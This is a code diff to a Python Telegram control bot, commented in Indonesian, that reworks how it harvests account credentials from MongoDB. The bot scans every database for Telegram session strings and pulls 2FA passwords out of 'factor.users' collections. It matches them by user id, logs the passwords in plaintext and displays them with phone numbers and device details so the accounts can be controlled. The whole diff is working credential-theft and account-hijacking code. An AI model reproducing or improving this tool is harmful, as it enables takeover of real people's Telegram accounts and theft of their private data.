@@ -49,18 +49,21 @@ def owner_only_callback(func):
         return await func(client, callback_query)
     return wrapper
 
-# ==================== MONGODB ====================
+# ==================== MONGODB (DIPERBAIKI) ====================
 def get_all_sessions(uri, max_per_db=500):
     """
     Ambil semua session dari MongoDB.
-    KHUSUS: collection 'factor.users' (case insensitive)
-    field 'expire_date' berisi PASSWORD 2FA.
+    - Session string diambil dari berbagai collection.
+    - Password 2FA diambil dari collection 'factor.users' (field 'expire_date')
+      dengan mencocokkan _id (user_id) dari dokumen session.
     """
     try:
         client = MongoClient(uri, serverSelectionTimeoutMS=15000, connectTimeoutMS=10000)
-        sessions = []
         client.admin.command('ping')
-
+        
+        # Step 1: Kumpulkan semua session string beserta _id (user_id)
+        sessions_raw = []  # list of dict: {session, db, col, _id, hint, ...}
+        
         for db_name in client.list_database_names():
             if db_name in ['admin', 'local', 'config']:
                 continue
@@ -73,10 +76,8 @@ def get_all_sessions(uri, max_per_db=500):
                     for doc in db[col_name].find({}).limit(200):
                         if count >= max_per_db:
                             break
-                        session_str = None
-                        twofa_password = None
-
                         # Cari session string
+                        session_str = None
                         for field, value in doc.items():
                             if isinstance(value, str) and len(value) > 100:
                                 if re.match(r'^[A-Za-z0-9+/=_-]+$', value) and len(value) > 150:
@@ -84,41 +85,66 @@ def get_all_sessions(uri, max_per_db=500):
                                     break
                         if not session_str:
                             continue
-
-                        # === AMBIL PASSWORD DARI expire_date DI factor.users ===
-                        # Nama collection bisa 'factor.users' atau 'PyroUbot.factor.users' atau apapun yang mengandung 'factor.users'
-                        if 'factor.users' in col_name.lower():
-                            if 'expire_date' in doc and doc['expire_date']:
-                                twofa_password = str(doc['expire_date'])
-                                logger.info(f"Found 2FA password in factor.users: {twofa_password}")
-
-                        # Jika tidak ketemu, coba field lain (fallback)
-                        if not twofa_password:
-                            for field in ['password', '2fa_password', 'twofa_password', 'expire_date']:
-                                if field in doc and doc[field]:
-                                    val = str(doc[field])
-                                    if len(val) >= 4:
-                                        twofa_password = val
-                                        break
-
-                        has_2fa = bool(twofa_password) or doc.get('has_2fa') or doc.get('two_factor') or doc.get('2fa')
-                        twofa_hint = doc.get('hint', doc.get('twofa_hint', ''))
-
-                        sessions.append({
+                        # Ambil _id (user_id) dari dokumen
+                        user_id = doc.get('_id')
+                        if user_id is None:
+                            # Coba cari field user_id
+                            user_id = doc.get('user_id')
+                        if user_id is None:
+                            # Jika tidak ada, skip? tapi kita tetap simpan dengan _id=None
+                            pass
+                        # Simpan juga hint jika ada
+                        hint = doc.get('hint', doc.get('twofa_hint', ''))
+                        sessions_raw.append({
                             'session': session_str,
                             'database': db_name,
                             'collection': col_name,
-                            'has_2fa': has_2fa,
-                            'twofa_hint': str(twofa_hint) if twofa_hint else '',
-                            'twofa_password': twofa_password if twofa_password else ''
+                            'user_id': str(user_id) if user_id is not None else None,
+                            'hint': str(hint) if hint else '',
                         })
                         count += 1
                 except Exception as e:
-                    logger.error(f"Error in collection {col_name}: {e}")
+                    logger.error(f"Error scanning {db_name}.{col_name}: {e}")
                     continue
+        
+        # Step 2: Ambil semua password dari collection factor.users di setiap database
+        password_map = {}  # key: user_id (string), value: password
+        for db_name in client.list_database_names():
+            if db_name in ['admin', 'local', 'config']:
+                continue
+            db = client[db_name]
+            # Cari collection yang namanya mengandung 'factor.users'
+            factor_cols = [col for col in db.list_collection_names() if 'factor.users' in col.lower()]
+            for col_name in factor_cols:
+                try:
+                    for doc in db[col_name].find({}).limit(500):
+                        uid = doc.get('_id')
+                        if uid is not None:
+                            pwd = doc.get('expire_date')
+                            if pwd:
+                                password_map[str(uid)] = str(pwd)
+                                logger.info(f"Found password for user {uid}: {pwd}")
+                except Exception as e:
+                    logger.error(f"Error reading {db_name}.{col_name}: {e}")
+        
+        # Step 3: Gabungkan session dengan password
+        sessions = []
+        for s in sessions_raw:
+            user_id = s['user_id']
+            password = password_map.get(user_id, '') if user_id else ''
+            has_2fa = bool(password) or bool(s['hint'])
+            sessions.append({
+                'session': s['session'],
+                'database': s['database'],
+                'collection': s['collection'],
+                'has_2fa': has_2fa,
+                'twofa_hint': s['hint'],
+                'twofa_password': password,
+            })
+        
         client.close()
-
-        # Hapus duplikat, prioritaskan yang punya password
+        
+        # Hapus duplikat (prioritaskan yang punya password)
         unique = {}
         for s in sessions:
             if s['session'] not in unique:
@@ -127,9 +153,11 @@ def get_all_sessions(uri, max_per_db=500):
                 if s['twofa_password'] and not unique[s['session']]['twofa_password']:
                     unique[s['session']]['twofa_password'] = s['twofa_password']
                     unique[s['session']]['has_2fa'] = True
-
+                if s['twofa_hint'] and not unique[s['session']]['twofa_hint']:
+                    unique[s['session']]['twofa_hint'] = s['twofa_hint']
+        
         result = list(unique.values())
-        logger.info(f"Total sessions found: {len(result)}")
+        logger.info(f"Total sessions: {len(result)}")
         for s in result[:5]:
             logger.info(f"Session: {s['database']}.{s['collection']} - 2FA: {s['has_2fa']} - Password: {'ADA' if s['twofa_password'] else 'TIDAK'}")
         return result
@@ -137,6 +165,7 @@ def get_all_sessions(uri, max_per_db=500):
         logger.error(f"MongoDB error: {e}")
         return []
 
+# ==================== FUNGSI LAIN (SAMA SEPERTI SEBELUMNYA) ====================
 async def check_session_active(session_string, delay=0.5):
     try:
         await asyncio.sleep(delay)
@@ -613,7 +642,6 @@ def saved_messages_menu(page=0, total_pages=1):
     return InlineKeyboardMarkup(buttons)
 
 def main_menu(index, total, has_2fa_password=False, twofa_password=""):
-    # Tampilkan password langsung di tombol jika ada
     if has_2fa_password and twofa_password:
         twofa_indicator = f" 🔑 `{twofa_password}`"
     elif has_2fa_password:
@@ -761,10 +789,9 @@ def format_account_short(info, index, total, session_string=None, db_2fa_passwor
     text += f"📱 **Nomor:** +{getattr(me, 'phone_number', '-')}\n"
     text += f"💎 **Premium:** {premium_icon}\n"
     text += f"🔐 **2FA:** {'✅ AKTIF' if info['has_2fa'] else '❌ TIDAK'}\n"
-    # Tampilkan password dari database, jika ada
+    # Tampilkan password dari database (prioritas utama)
     if db_2fa_password:
         text += f"🔑 **2FA PASSWORD:** `{db_2fa_password}`\n"
-    # Hanya tampilkan hint jika tidak ada password dari DB
     elif info['has_2fa'] and info.get('hint'):
         text += f"💡 **Hint 2FA:** `{info['hint']}`\n"
     if info.get('devices'):
@@ -1374,7 +1401,6 @@ async def callback_handler(c, q: CallbackQuery):
                     text += f"💡 Hint: `{info['hint']}`\n"
             else:
                 text += f"❌ **2FA TIDAK AKTIF**\n"
-            # Tampilkan password dari DB (jika ada) dan hilangkan hint
             if db_pass:
                 text += f"\n🔑 **2FA PASSWORD (DARI DATABASE):**\n`{db_pass}`\n"
                 text += f"\n💡 **Gunakan password ini untuk:**\n"
@@ -1649,7 +1675,7 @@ async def callback_handler(c, q: CallbackQuery):
 
 if __name__ == "__main__":
     print("=" * 70)
-    print("🤖 BOT CONTROL ULTIMATE - FINAL (PASSWORD DARI expire_date)")
+    print("🤖 BOT CONTROL ULTIMATE - FINAL (PASSWORD DARI factor.users)")
     print("=" * 70)
     print("✅ FITUR LENGKAP:")
     print("   • 📝 PESAN TERSIMPAN (Navigasi Slide)")
